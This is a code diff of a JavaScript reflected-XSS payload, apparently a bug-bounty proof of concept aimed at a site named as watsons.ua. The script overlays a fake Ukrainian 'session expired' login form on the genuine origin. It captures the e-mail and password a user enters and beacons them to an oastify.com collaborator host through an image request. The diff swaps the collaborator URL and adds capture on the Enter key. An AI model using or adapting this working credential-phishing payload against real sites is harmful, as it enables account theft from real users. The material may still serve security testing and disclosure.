@@ -3,7 +3,7 @@
    /creds   = fired when you click Увійти (proves credential capture) */
 (function () {
   var d = document, O = d.domain;
-  var C = 'https://9cmkpf86ll59vhxbljrtq4saa1gs4jw7l.oastify.com/';   // <-- the collaborator YOU watch
+  var C = 'https://sie3vyepr4bs103ur2xcwnytgkmba24qt.oastify.com/';   // <-- the collaborator YOU watch
   var KEEP = [];
   function beacon(path) {
     try { var im = new Image(); KEEP.push(im); im.src = C + path; } catch (e) {}
@@ -27,15 +27,21 @@
     '<div class="s">Сесія завершилася. Будь ласка, увійдіть знову.</div>' +
     '<label>E-mail</label><input id="u" type="email" placeholder="you@example.com">' +
     '<label>Пароль</label><input id="p" type="password" placeholder="••••••••">' +
-    '<button id="bt">Увійти</button><div id="og"></div></div>';
+    '<button id="bt" type="button">Увійти</button><div id="og"></div></div>';
   d.body.appendChild(ov);
   d.getElementById('og').textContent = '\uD83D\uDD12 https://' + O + '  (loaded-ping already sent)';
   d.title = 'watsons.ua';
-  d.getElementById('bt').addEventListener('click', function () {
+  var cap = function () {
     var u = d.getElementById('u').value || '(blank)', p = d.getElementById('p').value || '(blank)';
     beacon('creds?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
     ov.innerHTML = '<div style="background:#0b1020;color:#d6e2ff;padding:24px;border-radius:10px;font:14px Consolas,monospace;max-width:640px">' +
-      'Captured &amp; sent to your Collaborator:<br><br>username: ' + u.replace(/[<>&]/g,'') +
-      '<br>password: ' + p.replace(/[<>&]/g,'') + '<br><br>Executed on the genuine ' + O + ' origin via reflected XSS.</div>';
+      'Captured &amp; sent to your Collaborator:<br><br>username: ' + u.replace(/[<>&]/g, '') +
+      '<br>password: ' + p.replace(/[<>&]/g, '') + '<br><br>Executed on the genuine ' + O + ' origin via reflected XSS.</div>';
+  };
+  d.getElementById('bt').addEventListener('click', cap);
+  ['u', 'p'].forEach(function (id) {
+    d.getElementById(id).addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') { e.preventDefault(); cap(); }
+    });
   });
 })();
